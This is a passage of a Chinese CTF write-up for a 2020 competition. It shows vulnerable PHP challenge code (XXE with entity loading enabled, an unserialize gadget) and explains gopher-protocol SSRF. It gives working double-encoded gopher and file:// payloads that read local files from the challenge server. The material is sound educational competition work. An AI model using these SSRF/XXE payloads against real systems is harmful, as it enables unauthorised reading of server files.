+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="c1">#这题和命令执行无关，请勿尝试
+</span><span class="c1">#there is main.php and hints.php
+</span><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">){</span>
+<span class="k">die</span><span class="p">(</span><span class="s1">&#39;show me your identify&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nx">libxml_disable_entity_loader</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
+<span class="nv">$resp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$data</span> <span class="o">!=</span> <span class="k">false</span><span class="p">){</span>
+    <span class="nv">$dom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMDocument</span><span class="p">();</span>
+    <span class="nv">$dom</span><span class="o">-&gt;</span><span class="na">loadXML</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nx">LIBXML_NOENT</span><span class="p">);</span>
+    <span class="nx">ob_start</span><span class="p">();</span>
+    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$dom</span><span class="p">);</span>
+    <span class="nv">$resp</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
+    <span class="nx">ob_end_clean</span><span class="p">();</span>
+    
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="nt">div</span><span class="p">.</span><span class="nc">main</span><span class="p">{</span>
+    <span class="k">width</span><span class="p">:</span><span class="mi">90</span><span class="kt">%</span><span class="p">;</span>
+    <span class="k">max-width</span><span class="p">:</span><span class="mi">50</span><span class="kt">em</span><span class="p">;</span>
+    <span class="k">margin</span><span class="p">:</span><span class="mi">0</span> <span class="kc">auto</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">textarea</span><span class="p">{</span>
+    <span class="k">width</span><span class="p">:</span><span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
+    <span class="k">height</span><span class="p">:</span><span class="mi">10</span><span class="kt">em</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span><span class="o">]</span><span class="p">{</span>
+    <span class="k">margin</span><span class="p">:</span> <span class="mi">1</span><span class="kt">em</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;main&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;data&#34;</span><span class="p">&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="p">(</span><span class="nv">$data</span><span class="o">!=</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span><span class="o">:</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">textarea</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">/&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;_blank&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">basename</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;?s&#39;</span><span class="p">;</span><span class="cp">?&gt;</span><span class="s">&#34;</span><span class="p">&gt;</span>View Source Code<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$resp</span><span class="p">);</span><span class="cp">?&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>就是一个简单的无过滤的xxe，需要post传值，并且只能本地访问
+想到<code>Gopher</code>协议</p>
+<h3 id="gopher的构造"><code>Gopher</code>的构造</h3>
+<p>由于gopher可以构造各种HTTP请求包，所以gopher在SSRF漏洞利用中充当万金油的角色
+基本协议格式：URL:<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p>
+<p>几个注意点：</p>
+<ul>
+<li>gopher协议没有默认端口，所以需要指定web端口</li>
+<li>回车换行使用%0d%0a</li>
+<li>如果多个参数，参数之间的&amp;也需要进行URL编码</li>
+<li>结尾也得使用%0d%0a作为数据包截止的标志</li>
+</ul>
+<p>实际测试以及阅读文章中发现gopher存在以下几点问题</p>
+<ul>
+<li>PHP的curl默认不跟随302跳转</li>
+<li>curl7.43gopher协议存在%00截断的BUG，v7.45以上可用</li>
+<li>file_get_contents()的SSRF，gopher协议不能使用URLencode</li>
+<li>file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败</li>
+</ul>
+<h4 id="get">GET</h4>
+<p>GET的HTTP包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">GET /get.php?name=leon HTTP/1.1
+Host: 127.0.0.1
+</code></pre></td></tr></table>
+</div>
+</div><p>构造后：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">gopher://127.0.0.1:80/_GET%20/get.php%3fname=leon%20HTTP/1.1%0d%0AHost:%20127.0.0.1%0d%0A
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="post">POST</h4>
+<p>必须的头部：</p>
+<ul>
+<li>Host</li>
+<li>Content-Type</li>
+<li>Content-Length</li>
+<li>需要post的数据</li>
+</ul>
+<p>POST的HTTP包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">POST /post.php HTTP/1.1
+host:127.0.0.1
+Content-Type:application/x-www-form-urlencoded
+Content-Length:9
+
+name=leon
+</code></pre></td></tr></table>
+</div>
+</div><p>构造后：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">gopher://127.0.0.1:80/_POST%20/post.php%20HTTP/1.1%0d%0AHost:127.0.0.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:9%0d%0A%0d%0Aname=leon%0d%0A
+</code></pre></td></tr></table>
+</div>
+</div><p>然后来看本题：
+需要用gopher协议向<code>xxe.php</code>post<code>xxepayload</code>
+测试过程中发现，直接向<code>http://121.36.64.91/?a=leon&amp;b=leon&amp;c=http://127.0.0.1/xxe.php</code>post<code>payload</code>时抓包：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200626235358.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200626235358.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200626235358.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200626235358.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200626235358.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200626235358.png" />
+可以发现<code>data</code>是被urlencode过的，所以gopher构造时，<code>data</code>也应该是urlencode过的，因为这里是打ssrf，浏览器会解码一次，curl会再解码一次，所以需要构造的gopher数据进行二次编码：
+构造的gopher：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">POST /xxe.php HTTP/1.1
+Host: 121.36.64.91
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 225
+Upgrade-Insecure-Requests: 1
+
+data=%3C%3Fxml%20version%20%3D%20%221.0%22%3F%3E%0A%3C!DOCTYPE%20ANY%20%5B%0A%20%20%20%20%3C!ENTITY%20f%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dhints.php%22%3E%0A%5D%3E%0A%3Cx%3E%26f%3B%3C%2Fx%3E
+</code></pre></td></tr></table>
+</div>
+</div><p>二次编码后：（记得换行符替换）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">POST%2520%2fxxe.php%2520HTTP%2f1.1%250D%250AHost%253A%2520121.36.64.91%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%2520225%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Adata%253D%25253C%25253Fxml%252520version%252520%25253D%252520%2525221.0%252522%25253F%25253E%25250A%25253C%2521DOCTYPE%252520ANY%252520%25255B%25250A%252520%252520%252520%252520%25253C%2521ENTITY%252520f%252520SYSTEM%252520%252522php%25253A%25252F%25252Ffilter%25252Fconvert.base64-encode%25252Fresource%25253Dhints.php%252522%25253E%25250A%25255D%25253E%25250A%25253Cx%25253E%252526f%25253B%25253C%25252Fx%25253E%250D%250A
+</code></pre></td></tr></table>
+</div>
+</div><p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">http://121.36.64.91/?a=leon&amp;b=leon&amp;c=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2fxxe.php%2520HTTP%2f1.1%250D%250AHost%253A%2520121.36.64.91%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%2520225%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Adata%253D%25253C%25253Fxml%252520version%252520%25253D%252520%2525221.0%252522%25253F%25253E%25250A%25253C%2521DOCTYPE%252520ANY%252520%25255B%25250A%252520%252520%252520%252520%25253C%2521ENTITY%252520f%252520SYSTEM%252520%252522php%25253A%25252F%25252Ffilter%25252Fconvert.base64-encode%25252Fresource%25253Dhints.php%252522%25253E%25250A%25255D%25253E%25250A%25253Cx%25253E%252526f%25253B%25253C%25252Fx%25253E%250D%250A
+</code></pre></td></tr></table>
+</div>
+</div><p>到这里根据提示读main.php和hints.php:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">A</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$object</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$method</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$variable</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$o</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="p">;</span>
+        <span class="nv">$m</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">;</span>
+        <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">variable</span><span class="p">;</span>
+        <span class="nv">$o</span><span class="o">-&gt;</span><span class="nv">$m</span><span class="p">();</span>
+        <span class="k">global</span> <span class="nv">$$v</span><span class="p">;</span>
+        <span class="nv">$answer</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+        <span class="nx">ob_end_clean</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">B</span>
+<span class="p">{</span>
+    <span class="k">function</span> <span class="nf">read</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nx">ob_start</span><span class="p">();</span>
+        <span class="k">global</span> <span class="nv">$answer</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$answer</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">){</span>
+<span class="k">die</span><span class="p">(</span><span class="s1">&#39;show me your identify&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;‬&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;‬&#39;</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">CaptureTheFlag</span><span class="p">();</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;you do not pass the misc&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>hints.php就不放了，太智障了
+<strong>槽点1</strong>：<code>$_GET['‬']</code>乍一看啥都没有，直接复制丢进url栏一看，发现是不可见字符<code>%E2%80%AC</code>，然后hints.php起初不知道是用来干嘛的，反序列化搞完了发现<code>ob_start()</code>开启了无法输出内容，还以为hints.php是用来提示什么，后来<a href="http://caoyi.site" target="_blank" rel="noopener noreffer">caoyi小哥哥</a>提示我两个数md5不同我才发现原来是用来提示
+<code>%E2%80%AC</code>的。。。。？？？
+<strong>槽点2</strong>：到现在做完了还不知道预期到底是啥，如果预期是利用<code>$poc=$_SERVER['QUERY_STRING'];</code>的特性，将<code>flag</code>等被过滤的关键词用url编码绕过，那么直接在index.php用file协议就可以读到flag.php:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">http://121.36.64.91/?a=leon&amp;b=leon&amp;leon=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200627001930.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200627001930.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200627001930.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200627001930.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200627001930.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200627001930.png" /></p>
+<p>那我还需要到xxe.php去用gopher协议打xxe读flag.php?
+两个地方都是要url编码绕过关键词</p>
+<p>如果预期是main.php绕过ob_start()进行输出，那我等一手wp，看完了再来复现</p>
+<blockquote>
+<p>参考：<a href="https://zhuanlan.zhihu.com/p/112055947" target="_blank" rel="noopener noreffer">Gopher协议在SSRF漏洞中的深入研究</a></p>
+</blockquote></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-06-25</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/" data-title="“第五空间”智能安全大赛2020 Writeup" data-hashtags="unserialize"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/" data-hashtag="unserialize"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/" data-title="“第五空间”智能安全大赛2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/unserialize/">unserialize</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" class="prev" rel="prev" title="（中计量）第一届大学生CTF竞赛 Writeup"><i class="fas fa-angle-left fa-fw"></i>（中计量）第一届大学生CTF竞赛 Writeup</a>
+            <a href="/%E5%8F%88%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8phpuns-writeup/" class="next" rel="next" title="又见反序列化逃逸(phpuns) Writeup">又见反序列化逃逸(phpuns) Writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your 